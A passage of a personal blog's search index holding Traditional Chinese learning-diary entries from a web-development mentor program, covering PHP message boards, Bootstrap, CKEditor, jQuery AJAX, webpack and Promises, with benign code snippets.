有幾關真的要多想一下才有辦法解出來，花了蠻多時間，但破關後蠻有成就感的。總體來說這是一個值得一玩的好遊戲。 學到的事情 可以用 ESC 來阻止 JavaScript 自動轉址 這個我真的不知道，太～～～驚人了。 小遊戲 幾 A 幾 B 猜數字 不知道我的童年發生了什麼，這是我第一次玩這個遊戲。 其次的話是複習 week5 ~ week9 的內容，大致上沒什麼問題，繼續加油！ 題外話又到了快樂的周末，周末是跟女朋友一起看電影的快樂時光 (´,,•ω•,,)♡ 許願池明天應該會去看 [MTR101] 來複習前幾周的內容，進度順利的話會把 week10 心得寫完，接著進入 week11 的內容。","link":"/2022/02/12/mentor-program-day60/"},{"title":"mentor-program-day61","text":"複習的一天。 進度今天看 [MTR101] 來複習，主要複習了 git、unit test 還有程式基礎。一個比我預期中花時間的時光，但相信複習還是有幫助的，所以多加油吧！ 接著也趁著複習做了一題 week2 的 超級超級挑戰題（不知道有沒有超級超級超級挑戰題）：大數相加與相乘。花了不少時間，但做出來真的滿滿成就感 d(`･∀･)b 學到的事情 善用 branch 今天領悟到下次要改東西的話不要再用複製大法，而是直接開分支，成本低又快速方便，不開嗎？ 變數的底層運作 再次複習了這個很重要的觀念，之前做 unit test 時沒有測到陣列 or 物件的情形，剛好沒踩到這個雷，如果現在沒複習的話大概會被雷的不要不要的 (´∩ω∩｀) 還有 function 也是存記憶體位址，所以： 1234const a = () =&gt; 1;const b = () =&gt; 1;console.log(a === b) // falseconsole.log(a() === b()) // true 備註：一定要搞清楚，上面是比「變數儲存的值」下面是比「回傳值」。 應該是因為很少人會拿 function 去比對，所以今天上課才想到「哦！對耶，function 確實也是這樣」，一種大家都知道但沒人注意過的冷知識。 題外話明天鬼滅完結，耶。 許願池希望明天把複習做完，接著繼續趕進度。","link":"/2022/02/13/mentor-program-day61/"},{"title":"mentor-program-day62","text":"要進到下一週了。 進度今天把 [MTR01] 看到想看的地方了，也寫了 week10 的複習心得，最後把該做的事情都做完了。 寫完作業後看了幾位同學的心得，有從別人身上學到一些蠻有趣的東西，也看到每個人在學習中碰到了哪些障礙，以及如何解決與面對的。 學到的事情CSS 多行文字顯示 … 的效果，這一招就是從別人的心得裡學來的，一個蠻有趣的作法。 同樣的教學方式，每個人覺得困難的地方都不同，例如有同學覺得切版很難，認為 CSS 的邏輯各種複雜，但是卻能解出 貪婪的小偷 Part2，這題我光 google 關鍵字就感到頭痛的東西；也有同學很有趣，他的想法是 UI 越漂亮他就越有動力寫 JS，但 UI 很差的話就沒有動力；也有同學甚至因為厭惡 CSS 而跑去學預處理器。總之什麼樣的人都有，每個人都有自己喜歡與討厭的東西。 另外也體會到表達能力好與不好的區別，像我自己跟其他同學就是屬於不好的那個，但還是能看出他們就跟自己一樣，盡力用自己知道的詞彙來闡述一項知識。儘管我每天都寫日記與筆記，文筆還是差強人意，不過相信還是有慢慢地在變好吧，希望我有天也能學會說話的藝術，以及清楚表達的能力。 題外話不，鬼滅完結了 QQ，只好繼續期待下一季。 許願池明天要進到 week11，還是老話一句，希望進度順利～","link":"/2022/02/14/mentor-program-day62/"},{"title":"mentor-program-day63","text":"繼續努力四個月。 進度今天延續 [BE101] 的剩餘內容，留言板這個專案也終於要畫下一個結尾了。繼續期待之後的網站部屬。 學到的事情終於把留言板做成一個比較完整的專案了： 現在多了編輯、刪除和分頁的功能，在學完後也了解到為什麼這些功能要留到最後才教。雖然 MySQL 是個關聯式資料庫，但在前面幾週都沒有實際發揮「關聯」的功能，很多東西都是獨立寫死的。 「資料庫正規化」就是真正利用關聯的特性來把每個 table 給做關聯。一開始不教這個應該是因為比較複雜，而且 Join 語法相較於一般的 SQL 又更複雜一些，也許是基於這個理由才留到最後教吧，我猜的。 分頁功能是個蠻有趣的東西，像分頁的實作方式其實有分成兩種，一種是 offset，一種是 cursor。這兩種在我串 Twitch API 的時候都用過，當時覺得 offset 直覺多了，cursor 是什麼反人類的作法？但後來看完文章後才了解原來 cursor 的好處還蠻多的，怪不得 Twitch 新版 API 要用 cursor 來取代 offset。但對於初學者來說我還是認為 offset 絕對比較直觀好懂。 也因為之前串 Twitch 的時候就用過分頁功能了，所以今天在實作時沒碰到太大困難。有趣的地方是原來分頁功能是用 SQL 的方式來實現的這點很有意思，也從這次實作更理解前後端之間的脈絡。 題外話希望我能在接下來的時間變得更強。 許願池明天把 [BE101] 剩下的部分作完就能開始做作業了，加油！","link":"/2022/02/15/mentor-program-day63/"},{"title":"mentor-program-day64","text":"慶祝人生第一支 API～ 進度今天把留言板做最後的權限調整，接著就實作 API 了。 簡單秀一下成果： 雖然只是拿原本的東西修修剪剪，但還是覺得很神奇。 另外附一下今天作的筆記： 用 PHP 做一個最基本的 API 從 PHP 學習權限管理的重要性 用 PHP 實作分頁功能 學到的事情[BE101] 這門課可以說是我目前覺得最有趣的一堂，很多我以前覺得複雜的東西都在這門課搞懂了。特別是資料庫的部分，如果沒有實際去玩過的話，我可能至今還是以為分頁功能是用什麼黑魔法做出來的，API 是用了什麼很複雜的概念做出來的。 總之，這門課的收穫遠比我預期來得多，也培養了很多資安的概念（以前是 0），真的很佩服 huli 的課程安排，也體會到「脈絡」對學習的重要性，只要搞清楚脈絡，很多東西就能融會貫通，這點是真的。 題外話最近開始對自動化腳本有興趣，也寫了一些解決生活問題的小程式，不知道這算不算學以致用，總之很開心，自己終於開始能做出一些有趣的玩意兒了。 許願池明天應該就能開始做作業了吧，這週作業就比上週多了，希望能寫的順利。","link":"/2022/02/16/mentor-program-day64/"},{"title":"mentor-program-day65","text":"開心的一天。 進度今天開始做作業，把留言板加上身分功能還有管理權限： 看起來是個簡單的功能，卻花了比預期久的時間來完成。也許是在考慮資安問題時想了比較多，希望自己沒有做出漏洞網站 QQ。 目前有考慮到的漏洞： 一般用戶、訪客不能進入管理頁面（直接輸入網址也不行） 不能透過網址發出偽造的 request 來更改權限 希望這樣有做到基本的安全性… 學到的事情要讓一個網站不存在漏洞實在要非常細心，很多時候都是自己以為這樣是安全的。但不是這樣子，通常都是沒有想到別人可以這樣攻擊。 huli 說的一句話很有道理「一個網站只要被發現一個漏洞，就會破口大開；可是要把一個網站做的安全，卻要考慮所有可能被攻擊的方式」，當坦要付出的心力比一般人還要多啊 ｡ﾟ(ﾟ´ω`ﾟ)ﾟ｡ 題外話如果時間能重來，希望自已更早開始學程式。 許願池明天應該能做第二個作業，順利的話就能把 week11 畫下句點。","link":"/2022/02/17/mentor-program-day65/"},{"title":"mentor-program-day66","text":"切版版日。 進度今天把留言板的 bug 修好後，就開始做第二份作業，目前把會用到的頁面都切好了： 原本應該是要手刻才對，不過實在很想把百大企業都愛用的「Bootstrap」學起來，所以這一次就直接用 Bootstrap 來做。 學到的事情要用一句話來形容 Boostrap 的話就是： 很快。 雖然確實會像很多人說的綁手綁腳，改東西不是那麼直觀，但如果你只是要一個「看起來還不錯」的版面，Bootstrap 無疑是個好選擇（不過還是要會原生 CSS 就是了，不然切出來的版會有一股很重的 BS 味），昨天切完每個版大概花了 3 ~ 4 小時吧。 儘管用了 Bootstrap 後節省了不少時間，但我覺得重點還是要知道怎麼去客製化，理解它的結構。所以你還是要理解底層的 CSS 邏輯，要不然真的只能一路 Copy and Paste 到底，我想這樣沒什麼意義，也不是大部分人的需求。 希望接下來能把 Bootstrap 弄熟，除了加快切版速度之外，也希望能提升客製化的能力，讓框架不再只是框架。 題外話漸漸把以前的坑一步一步填完。 許願池明天繼續做作業二，開發真正的功能，希望能一天就搞定。","link":"/2022/02/18/mentor-program-day66/"},{"title":"mentor-program-day67","text":"Keep going。 進度今天把部落格的主要功能給做完了： 登入機制 單篇文章閱覽 新增、刪除文章 新增、刪除分類 分頁功能 慢慢理解為什麼要用 MVC 這個東西了，當改一個地方就要改一大堆頁面的時候真的蠻麻煩的。 學到的事情雖然 PHP 寫起來很直覺，但當功能增加時就會變得很複雜。光是實作上面的功能就已經開了21 個 PHP 檔，如果眼睛不夠利的話很常會搞混哪個檔案在做什麼，是件蠻困擾的事情。 學會與雜亂的 code 相處 我想身為工程師必須學會的事情，code 再多再長，也是要想辦法找出你的目標，不能因為 code 長就眼花撩亂。 今天我也學到模組化的重要性，例如「導覽列」。 一開始為了處理 active（目前所在頁面）的效果，我是用一個一個改的方式來把該有 active 的 class 加上去。但後來發現這樣不行，如果之後要改一個東西，我不就要改一大堆頁面？完全不能接受。所以思考有沒有辦法把導覽列抽出來變成一個模組，於是就 nav.php 就誕生了： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?php $username = null; if (!empty($_SESSION['username'])) { $username = $_SESSION['username']; }?&gt;&lt;nav class=\"navbar navbar-expand-lg navbar-dark bg-dark\"&gt; &lt;div class=\"container\"&gt; &lt;a class=\"navbar-brand fw-bold\" href=\"index.php\"&gt;PeaNu&lt;/a&gt; &lt;button class=\"navbar-toggler\" type=\"button\" data-bs-toggle=\"collapse\" data-bs-target=\"#navbarSupportedContent\" aria-controls=\"navbarSupportedContent\" aria-expanded=\"false\" aria-label=\"Toggle navigation\"&gt; &lt;span class=\"navbar-toggler-icon\"&gt;&lt;/span&gt; &lt;/button&gt; &lt;div class=\"collapse navbar-collapse\" id=\"navbarSupportedContent\"&gt; &lt;ul class=\"navbar-nav me-auto mb-2 mb-lg-0 w-100\"&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link &lt;?php if (str_contains($_SERVER['REQUEST_URI'], '/categories.php')) { echo 'active'; } ?&gt;\" href=\"categories.php\"&gt;文章分類&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item me-lg-auto\"&gt; &lt;a class=\"nav-link &lt;?php if (str_contains($_SERVER['REQUEST_URI'], '/about.php')) { echo 'active'; } ?&gt;\" href=\"about.php\"&gt;關於我&lt;/a&gt; &lt;/li&gt; &lt;?php if (empty($username)) { ?&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link\" href=\"login.php\"&gt;登入&lt;/a&gt; &lt;/li&gt; &lt;?php } else { ?&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link &lt;?php if (str_contains($_SERVER['REQUEST_URI'], '/admin.php')) { echo 'active'; } ?&gt;\" href=\"admin.php\"&gt;後台管理&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link\" href=\"handle.logout.php\"&gt;登出&lt;/a&gt; &lt;/li&gt; &lt;?php } ?&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt;&lt;/nav&gt; 像這樣抽出來之後，每個檔案只要一句： 1require_once('nav.php'); 導覽列就會自動處理好登入 or 登出的狀態，要改東西也只要改這個檔案就好。 所以模組化確實是一個很重要的概念，希望之後也能善用模組來解決各種惱人的事。 題外話最近開始玩了 Pokemon unite。用投籃的方式來包裝 Dota 這一點蠻有創意的。以前沒有很喜歡玩這類的遊戲，這也是第一款讓我覺得還不錯玩的遊戲。 許願池作業二也快告一段落了，明天只要把剩下的分類頁面給做完，再做一點優化也許就完成了。","link":"/2022/02/19/mentor-program-day67/"},{"title":"mentor-program-day68","text":"辛苦但值得的一天。 進度今天花了不少時間把部落格加了很棒的功能： 分類導覽 / 分類過濾 引入文字編輯器 / 文章閱讀畫面優化 雖然途中踩了不少雷，但看到最後的成果就心滿意足了～ 學到的事情在做分類頁面跟篩選的時候，要「關聯」的資料變得越來越複雜，也因為這點練習了蠻多 SQL 的操作邏輯，感覺現在對 SQL 又更熟悉了一點吧！ 再來是串接 CKEditor 的部分。一開始在查資料的時候卡蠻久的，因為 CKEditor 有分成 4、5 的版本，原本沒想太多，想說就都找來看看，結果後來看到 4、5 是完全不相容的兩個版本，才開始乖乖找 5 的來看。總之，有點兜了個圈的感覺 (｡í _ ì｡) 再來是研究 CKEditor 功能，一開始懶惰的我想說能用 CDN 解決就用 CDN 解決吧！果不其然，被自己雷的不要不要的。後來花了很多時間爬資料，才知道要添加 Plug-in 的話得直接把 CKEditor 的源碼載下來調整後再重新編譯成 bundle。 這段過程還蠻有意思的，我學到很多「把別人寫好的套件加上自己想要的功能」這件事，例如說 Bootstrap 預設沒有某些 utilities，所以我就爬了官方文件成功搞出自己想要的 utilities；還有在弄 highlight.js 的時候想要加上 line-number 的功能，也是上網查了一下，發現有人寫了相關套件，但樣式的部分得自己寫 CSS，所以就用各種神奇的方式來捏出專屬自己的 code block。總之這是一段蠻辛苦但也很有意思的時光 (｡◕∀◕｡) 目前總算是把部落格告一個段落了，接下來又到了筆記時光，想把今天學到的都好好紀錄下來。 題外話今天查資料看到「UPD」。想說是什麼意思，查了才發現原來是 update…，果然懶人不分國界。 許願池明天要把部落格做最後優化跟檢查，接著就能做筆記了。","link":"/2022/02/20/mentor-program-day68/"},{"title":"mentor-program-day69","text":"複習跟做筆記的一天。 進度今天把部落格做最後的調整，還有做筆記： CSS :only-child highlight.js 的使用方法 CKEditor 的使用方法 大概就這樣～ 學到的事情當我重新回頭看一遍官方文件時，會發現自己當初忽略掉了一些內容，所以才會在某些地方卡關。不過這也蠻正常的，畢竟你通常不會想把所有時間都花在閱讀文件。所以說學會找出重點、整理一份給自己看的筆記，是我從第一天到現在寫了這麼多筆記後學到的事情。只要掌握這個技能，我相信要之後學一樣新東西或技術的時，你就能學得比別人快，比別人好。 另外多去嘗試也是蠻重要的事情吧，如果有個東西怎麼查都查不到資訊，或根本不知道該怎麼下關鍵字，那最簡單的方式就是去嘗試各種你覺得可能是什麼的實驗。例如我以前一直都搞不懂 highlight.js 的實際主題名稱 是什麼（像 A 11 Y Dark，檔案名稱不可能是這樣），直到把源碼載下來，發現裡面有每個對應的 CSS 檔案才恍然大悟。 題外話冷爆了，凍番薯（取自某媒體形容現在的台灣）。 許願池明天把筆記做完後 week11 應該就結束了，加油。","link":"/2022/02/21/mentor-program-day69/"},{"title":"mentor-program-day70","text":"進入 7 字頭。 進度今天把昨天沒做完的筆記做完，也寫了作業的問答題，但還沒寫完，明天要趕快補齊。 學到的事情在寫 CKEditor 的使用方法 的時候卡在一個地方卡了很久，最後發現原來是下載到太舊的版本，真是囧到極致 orz。 後來也因為好奇官方文件寫的兩種方法到底差在哪，研究了一段時間。 直接用 JS 引入： 123456789101112131415161718192021222324252627282930import ClassicEditor from '@ckeditor/ckeditor5-build-classic';import Indent from '@ckeditor/ckeditor5-indent/src/indent'; // &lt;--- ADDEDClassicEditor .create(document.querySelector( '#editor' ), { plugins: [Indent], // &lt;--- ADDED toolbar: { items: [ 'heading', '|', 'bold', 'italic', 'link', 'bulletedList', 'numberedList', '|', 'outdent', 'indent', // &lt;--- ADDED '|', 'uploadImage', 'blockQuote', 'insertTable', 'mediaEmbed', 'undo', 'redo', ] }, }) .catch( error =&gt; { console.error( error );}); 先改源碼在重新 build 一份： 12345678910111213141516171819202122232425262728293031323334import ClassicEditorBase from '@ckeditor/ckeditor5-editor-classic/src/classiceditor';import Essentials from '@ckeditor/ckeditor5-essentials/src/essentials';import UploadAdapter from '@ckeditor/ckeditor5-adapter-ckfinder/src/uploadadapter';import Autoformat from '@ckeditor/ckeditor5-autoformat/src/autoformat';import Bold from '@ckeditor/ckeditor5-basic-styles/src/bold';import Italic from '@ckeditor/ckeditor5-basic-styles/src/italic';import BlockQuote from '@ckeditor/ckeditor5-block-quote/src/blockquote';import Alignment from '@ckeditor/ckeditor5-alignment/src/alignment'; // &lt;--- ADDEDexport default class ClassicEditor extends ClassicEditorBase {}ClassicEditor.builtinPlugins = [ Essentials, UploadAdapter, Autoformat, Bold, Italic, BlockQuote, Alignment // &lt;--- ADDED // ...];ClassicEditor.defaultConfig = { toolbar: { items: [ 'heading', 'bold', 'alignment' // &lt;--- ADDED // ... ] }, // ...}; 我用的方法是第二種，還蠻好理解的，就是先改好設定後再重新 build 一份來用的概念。但第一種我在試的時候怎麼用都不行，直到後來看了 webpack 新手教學之淺談模組化與 snowpack 才知道原來要先用 webpack 來打包後再拿來用，後來照做後就成功引入了。 不過還是有個沒解開的問題，就是要添加新的 plug-in 時一直噴 duplicated modules（模組重複載入）的錯誤。 後來爬了這篇 提問 才知道問題應該出在這一句： 1import ClassicEditor from '@ckeditor/ckeditor5-build-classic'; 按照官方文件的意思是不可以在已經 build 後的檔案裡加新的 plug-in，因為 plug-in 可能需要依賴 src 裡面的其他套件（相依姓 dependencies）。另外 plug-in 也有一些 code 是 bundle 裡面已經有的，這就會導致duplicated modules（模組重複載入）的問題。（不過我還是沒試成功，怕花太多時間，所以之後有機會在試吧） 題外話有時候明明就大概懂了卻還是搞不定，真是件令人傷心的事。 許願池明天要把 week11 結束，加油！","link":"/2022/02/22/mentor-program-day70/"},{"title":"mentor-program-day71","text":"繼續進入下一週。 進度今天把 week11 最後的簡答題做完了。花了一整天的時間研究 CSRF，感覺有比較清楚一點了，雖然沒實作出來有點可惜。 學到的事情今天又再次複習資訊安全的知識： XSS SQL Injection CSRF 權限管理 在看完自我檢討後深深體會到資安的細節有多深。想做好資安，就得先把讓自己變成被害妄想症，對於任何細節都要秉持懷疑的心態來審視。 但也好在 Huli 對資安蠻有興趣的，才有機會學到這麼多跟資安有關的知識。希望自己未來在做專案的時候也能維持這個良好的精神，寫出讓人安安心心的 code。 題外話窩好冷～但女朋友覺得現在是台灣最舒服的天氣。 許願池明天要開始 week12，又是新的一週了，加油加油！","link":"/2022/02/23/mentor-program-day71/"},{"title":"mentor-program-day72","text":"看了後面幾週的課程後，默默感到壓力山大。 進度今天進入 week12，用 jQuey 和 Bootstrap 做了第一個作業： 也做了一些簡短筆記： jQuery 隨筆記 Loading-overlay 懶人包 用 jQuery 發 AJAX 學到的事情儘管以前就用過 jQuery，但那是在我 JS 基礎還沒有很完整的情況下學的。現在回想起來，確實有種知道用 jQuery 可以這樣做，但改成 JS 卻不知道怎麼做的問題，所以為什麼大家總會說「先把基礎打好再來學工具」就是這個原因吧。 至於 Bootstrap，從上一週開始跟它了解彼此之後，有漸漸抓到它「好用」的地方： 表單元件省事多了（自己做很麻煩，各種 pseudo-class 和預設樣式要處理） card button navbar list group 這些 Components，只要熟悉後改起來也很快 utilities，開始能接受這種 CSS 的寫法，不想寫 class 名稱的時候真的簡單暴力，說不定之後再熟一點就能去寫 Tailwind 了 以前的我很排斥用 Bootstrap，因為覺得要從別人的架構下去改 CSS 很麻煩。不過這個想法慢慢在改變，雖然加東西會讓 Code 看起來比較複雜一些，但這是無法避免的事。寫 code 不能要求凡事完美，而是要逐漸接受事情變得複雜一點這件事。當我習慣跟接受這些之後，就不再那麼排斥這件事了。 題外話天氣冷冷地就會想吃東西，但瘦不下去的我不敢亂吃，幫自己 QQ。 許願池明天會繼續做 week12 的作業，希望一樣能順利完成。","link":"/2022/02/24/mentor-program-day72/"},{"title":"mentor-program-day73","text":"對於未知的未來，內心偶爾會感到恐懼。 進度今天做了第二個作業，先把版切好跟做了基本功能： 新增 todo 刪除 todo 修改 todo（這個最難） 標記為已完成 學到的事情來談談 todo list。我認為它是一個看起來很基本，卻埋藏很多細節的小程式。 很多 App 平常在用的時候都沒感覺，例如說： 像這個「點下去彈出來小視窗的功能」，身為使用者會覺得這很直覺阿，本來就該這樣子。 可是實際去開發就會常常碰到「疑？這個熟悉的功能要實現好像有點複雜？」，或者是「怎麼做出來沒辦法像真的 App 一樣流暢」，時不時就會感受到要讓「介面與程式完美的接合」是件特別難的事情。 現在用 App 時都會特別注意以前沒注意到的細節，彈出動畫、音效、切換畫面或反饋效果，這些都是只有經歷過開發才能體會到的細節。要讓一個 App 用起來很直覺、很順暢，真的得下蠻多功夫的，這是我做了這幾週作業後的感觸。 題外話跑這份計畫也有段時間了，我覺得自己進步了很多，但還是會害怕對業界來說我不過是個菜渣，沒有達到業界的需求。 也許是我過去花了太多時間，也品嘗了無數次失敗的經驗才會讓我這麼擔心。不過，還是要繼續堅持下去，每天都要比昨天的自己還要強，是我對自己的期許。 許願池明天希望能把 todo list 完成，順利的話說不定能趕快進到下一週的進度。","link":"/2022/02/25/mentor-program-day73/"},{"title":"mentor-program-day74","text":"又到了快樂的連假，不過還是要好好利用時間。 進度今天稍微花了點時間做 jQuery 的筆記： jQuery 的 empty、remove 和 detach 的差別 jQuery 隨筆記 感覺又更認識 jQuery 了一點！ 接著延續昨天的 todo-list，把該做的功能加上去： 顯示所有 todo 顯示未完成 todo 顯示已完成 todo 把 todo 儲存成資料 接著只要跟後端串起來就差不多了，加油！ 學到的事情我覺得 jQuery 除了寫起來很簡潔以外，還有一個很棒的地方是作者設計了蠻多符合人性的 methods。像是 remove empty 和 detach，我原本以為它們就只有刪除元素的作用而已。可是在看過 這篇文章 之後才發現原來它們都有類似 cache 的機制存在。 cache 是一個很好的機制，利用它能夠實現「只想修改一部分內容」的需求。所以我在弄懂這些後就回去把編輯 todo 的程式碼給重構了。原本的思路是用 CSS 先把 A 藏起來，B 秀出來，現在變成是用 jQuery 把 A 移除後 cache 起來，把 B 秀出來，大概是這樣的差異吧。 雖然從效能上來說 CSS 的做法應該比較好（好像是因為瀏覽器不會「重繪」的關係），不過利用 cache 的作法我覺得蠻有趣的，所以就刻意用這個方法來完成。 題外話如果有時間的話，希望能去外面邊騎車邊看風景。看風景能夠把生活中的雜事給暫時拋開，所以我喜歡看風景，喜歡這種平平靜靜的時光。 許願池到了假日就是我進度變慢的時候，不過還是希望明天能順利把 todo list 完成。","link":"/2022/02/26/mentor-program-day74/"},{"title":"mentor-program-day75","text":"睡好睡滿的一天。 進度今天把 todo list 的最後一塊拼圖完成（後端存取資料）： 做完後突然感到怠惰，就跑去 Lidemy 看了其他的工具影片（webpack、SASS by 助教）。 webpack 真的是現代前端開發不可或缺的神器之一，不過也確實像 huli 說的，config 是比較麻煩的一點，希望之後能慢慢習慣跟掌握 webpack 的知識。 SASS 的部分助教講的詳細好懂，也學到很多我以前懶得去學的 function 和 if for 這些東西，因為這些進階語法對於小專案來說實在殺雞焉用牛刀，感受不到它們的好用之處。不過今天在上完助教的課後算是給我打了一門蠻好的基礎，之後要來花時間做點筆記了。 學到的事情在用 AJAX 傳資料到後端時稍微卡了一下，因為平常都是用表單的方式來帶資料，例如說： 12345678910111213141516171819// 取得表單元素const form = $('form');// 設定監聽器form.bind('submit', (e) =&gt; { // 停止預設行為 e.preventDefault(); // 發出 request $.ajax({ url: 'http://localhost/peanu/todo-list/api_save_todo.php', type: 'POST', // 預期回傳的資料格式 dataType: 'json', // 要傳過去的資料格式（表單） contentType: 'application/x-www-form-urlencoded; charset=UTF-8', // serialize() 取得表單的欄位值 data: $('form').serialize(), success: (response) =&gt; console.log(response) })}) 接著後端就能用 $_POST 拿到資料。 但現在資料格式變 JSON 後就不能這樣用，得用 file_get_contents('php://input') 才行，這一點還蠻不一樣的。 另外在做 json_encode 時也稍微有點混亂。一開始以為後端要把資料放到資料庫前要在 encode 一次，但其實不用，因為前端送來的資料就已經 encode 過了，這樣子是多此一舉，搞了場烏龍。 接著，後端最後要給前端 todo 的對應 id，原本想說要怎麼樣才能「從資料庫取出最新一筆資料」，上網查了一下發現可以用 MAX() 來取出最欄位的最大值，所以我用了這個方法： 1SELECT MAX(id) AS id FROM todos; 但後來發現我還蠻傻的，怎麼不用： 1SELECT * FROM todos ORDER BY id DESC LIMIT 1; 真是太蠢啦！不過也因此認識了一個新的解法，應該也不算吃虧啦。 題外話希望能跟女友永遠在一起，這才是我最想珍惜的一切。 許願池明天要把 week12 完成，希望啦～","link":"/2022/02/27/mentor-program-day75/"},{"title":"mentor-program-day76","text":"最後一天的假日。 進度今天把 week12 的作業完成跟檢討，終於又要進到 week13 了。 檢討作業的時候看了蠻多同學的作業，不過 code 的部分只有稍微看過，可能是有點懶了吧。 在檢討作業完後，又回去看了 [MTR01] 的一些內容。因為 week13 的 hw2 我沒有很懂要做什麼（因為沒有相關資源），所以想說能不能從 MTR01 裡面找出些線索。雖然看起來希望不大，不過沒關係，我相信最後還是能找到解決辦法的。 學到的事情今天好像沒什麼能特別紀錄的事情，主要就是檢討跟看影片。 不過在看 [MTR01] 時學到了 Transaction 與 Lock 的觀念，我覺得這兩個東西還蠻有趣的，因為背後要解決的問題是日常中很熟悉的事，例如說搶票、搶商品這些。 總之，雖然還沒有實作過，不過我應該會找個時間來試試看吧。 題外話還是老樣子，雖然有時候會迷失方向，但還是要努力堅持下去。 許願池明天可能會繼續看 [MTR01]，也或許會開始做 week13 的作業，總之加油吧！","link":"/2022/02/28/mentor-program-day76/"},{"title":"mentor-program-day77","text":"又睡太晚啦，進度少的可憐 QQ 進度今天繼續看 [FE201]，學習其他工具的使用。 學到的事情今天就不花太多時間打了，得趕快去補進度。 雖然在過去有用過 gulp、babel 和 webpack，但感覺還是不夠清楚它們該怎麼用比較好。希望這幾天看完影片並實作後可以弄清楚一些。 題外話gulp 感覺就是懶人想出來的東西，真厲害。 許願池明天會繼續看 [FE201]，邊實作邊作筆記。","link":"/2022/03/01/mentor-program-day77/"},{"title":"mentor-program-day78","text":"時間一天一天地過，自己也一天一天的成長。原來已經進入三月份了。 進度今天把 [FE201] 給看完了，對於該學的工具也都稍微地練習過了： babel 之再次複習 gulp 的使用方法 認識 webpack webpack 開發時的一些設定 雖然只是工具，但是對現代前端開發來說卻是不可或缺的東西。 學到的事情在學了 webpack 後我才真的明白什麼叫做「模組化開發」。即便以前用 Vue 時就已經用過import export，但老實說只知道怎麼用和知道背後的含意是不太一樣的。在真的知道以後才會理解「哦，原來是因為有 webpack 才能做這些事」，不然一直都以為是單純的 ES Module。 現在看到一堆 export default 或 import 不再那麼陌生了，其實背後要做的事情很簡單，不過就是把一座城堡拆成一個個的小樂高而已。 題外話看了不知道幾十遍的文章：零基礎的小明要如何成為前端工程師？，這之間大概經過了三、四年，直到現在我才真的從頭到尾搞清楚裡面在說什麼。不知道這是不是代表我已經成長了很多呢？ 總之，這篇文章對我來說還蠻特別的，每一次看都會有不同的感受。希望我能繼續成長下去，實現心中的目標。 許願池明天應該就會開始做作業了，加油～","link":"/2022/03/02/mentor-program-day78/"},{"title":"mentor-program-day79","text":"yo 停電了。 進度今天把寫了第一個作業，把 week6 的表單跟餐廳網頁用 SCSS 來改寫，另外也看了課綱提供的 fetch 與 Promise 補充教材，還差一些就看完了。 學到的事情以前一直不太懂 Promise 跟 fetch 的實際用法，都是看別人怎麼用就跟著用這樣子。今天能把這個坑給填完還不錯，希望之後能掌握這個技術，成為非同步大師。 題外話最近會利用閒暇時間先偷看 React 的內容，感覺 React 的思維真的跟原本差很多，有些東西似懂非懂的，希望之後能習慣 QQ 許願池來個久違的條列式： 把 fetch Promise 看完跟做筆記 做第二個作業。 加油～","link":"/2022/03/03/mentor-program-day79/"},{"title":"mentor-program-day80","text":"第 80 天～ 進度今天把 fetch 跟 Promise 給學完了，也做了筆記： 從 fetch 來認識 Promise fetch 處理錯誤的方式 fetch 發 post 的方式 fetch 的注意事項 用 Promise 來包裝 XMLHttpRequest 自己捏一個 Promise Promise 最大的用途？ async await 背後的原理 Promise 最大的用途？ 也因為全台大停電的關係，把以前買的書拿起來翻，學到了一些蠻有趣的小知識：你不知道的 console 小技巧 最後到了晚上好不容易復電，才開始做作業二。目前只做到一半，明天繼續加油～ 學到的事情今天因為停電的關係，利用時間跟女朋友利出去散散心。果然兩個人一起出門是最開心的事情。 在做作業二時開始改用 arrow function 與 components 的思維來寫 code，想先為以後的 React 鋪路。 感覺自己也慢慢踏上更高的領域，寫 code 的方式也慢慢得跟原本不同。這是蠻有趣的現象，在以前總會覺得為什麼一個簡單的 function 要刻意寫成這樣： 1234const getFancy = (aLowGuy) =&gt; { addSomeFancy(aLowGuy); return aLowGuy} 原本的習慣是這樣： 1234function getFancy () { addSomeFancy(aLowGuy); return aLowGuy} 也不知道怎麼說？有時候不知不覺就「這樣寫好像也蠻不錯」的感覺。 總之最重要的還是自己能接受就好，希望寫 code 技巧越來越厲害～ 題外話停電應該是一種強迫人類回歸大自然的方法。不過偶爾體驗這種很「原始」的生活也別有一番風味。 許願池希望明天可以把作業完成，然後就能進到最刺激的網站部署了！","link":"/2022/03/04/mentor-program-day80/"},{"title":"mentor-program-day81","text":"越來越接近尾聲。 進度今天把 week13 的作業都完成了。 整體來說還蠻順利的，比起 callback hell，async / await 真的是一大福音。 另外，雖然在檢討時有嘗試從同學的作業裡看看能不能猜出 webpack 插件怎麼寫，不過還是沒解出來，有點小可惜～ 學到的事情在重做 twitch 的作業後，感覺對 fetch Promise 和 async / await 有了更深的理解，真不錯。也有看到某個同學善用「模組機制」來完成這份作業，很像我以前在寫 Vue 時的那種形狀，不過我還不太熟要怎麼那樣寫，希望之後能漸漸掌握這種技巧。 雖然作業做完了，不過發現 week13 還有一些觀念沒補齊，就是 Sprite 與 Data URI。關於 Sprite 我以前有在書上看過，當時覺得這是蠻神奇的技巧，但又覺得有點麻煩，所以實務上還蠻少用到的。到了現在才理解原來它是一個節省資源的技術，看來還是乖乖學起來比較好！ 題外話還蠻開心的，感覺自己快走完這份計畫了，繼續加油加油！ 許願池希望明天把 week13 最後的一塊拼圖完成，接著就真的要來部署了。","link":"/2022/03/05/mentor-program-day81/"},{"title":"mentor-program-day82","text":"剛起步就踢到鐵板。 進度今天把 week13 剩餘的 CSS 知識給補齊： CSS 利用 Sprite 來提升效能 CSS 利用 Signature 來讓導覽列更好寫 CSS 利用 DataURI 來節省流量 本來在做完後就要去部屬網站了，沒想到才剛要註冊 AWS 帳號，就被電話驗證給卡住： 也許是因為一開始我都收不到驗證碼，重新試了太多次就被 ban 了 QQ 無奈之下之好寫信給 AWS 問問看： 希望能盡快解決這個問題 QQ 學到的事情既然沒辦法部署，就只好繼續跑進度。所以接下來我就去看 [FE201] 的課程。 不得不佩服 Huli 「整理重點」的能力，很多核心重點在課程裡都說得一清二楚。某種程度上來說這門課是我覺得 JS 系列裡最有趣的一堂，因為 JS 